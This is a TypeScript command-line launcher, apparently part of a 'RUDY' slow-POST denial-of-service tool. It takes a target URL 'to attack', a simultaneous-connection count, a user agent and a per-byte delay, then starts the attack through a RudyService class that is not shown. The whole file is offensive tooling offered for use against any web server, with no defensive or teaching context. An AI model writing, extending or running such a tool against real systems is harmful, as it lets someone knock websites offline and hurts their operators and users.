//
//  cli.ts
//  Tribe-cms
//
//  Created by Sahil Chaddha on 07/05/2018.
//  Copyright © 2018 Tribe-CMS.tv. All rights reserved.
//

import * as program from "commander"
import Rudy from "./main"
import ASCIIBanner from "./utils/ascii"
import { TargetNotFound, IError } from "./models/error.model"
import RudyService from "./service/rudy.service"
import logger from "./utils/logger"
const logCategory: string = "RUDY_CLI"
/* tslint:disable object-literal-sort-keys */

// Parse Arguments
program
.version("1.0.0")
.description("Sends slow RUDY Requests to target.")
.option("-t, --target <string>", "Target URL to attack")
.option("-c, --maxConnections <number>", "The number of connections to run simultaneously (Default: 50)")
.option("-a, --userAgent <string>", "Provide a Static User Agent. (Default: Random)")
.option("-d, --delay <number>", "Wait <seconds> before sending each byte. (Default: Random)")
.option("-v, --verbose", "Enable Verbose Logs (Default: false)")
.parse(process.argv)

// Shows ASCII banner
ASCIIBanner.showInfo()
.then(() => {
    // Throw Error if Target not specified
    if (program.target == null) {
        throw TargetNotFound
    }

    const config: Rudy.IRudyConfig = {
        target: program.target,
        maxConnections: program.maxConnections,
        userAgent: program.userAgent,
        delay: program.delay,
        verbose: program.verbose,
    }
    return config
})
.then((config: Rudy.IRudyConfig) => {
    const rudyService = new RudyService(config)
    return rudyService.attack()
})
.then(() => {
    logger.info({message: "Attack Completed.", category: logCategory})
})
.catch((error: IError) => {
    // Show Help on Error
    logger.error({message: error.message, category: error.category})
    logger.info({message: "Stopping Attack", category: logCategory})
    program.help()
    process.exit()
})
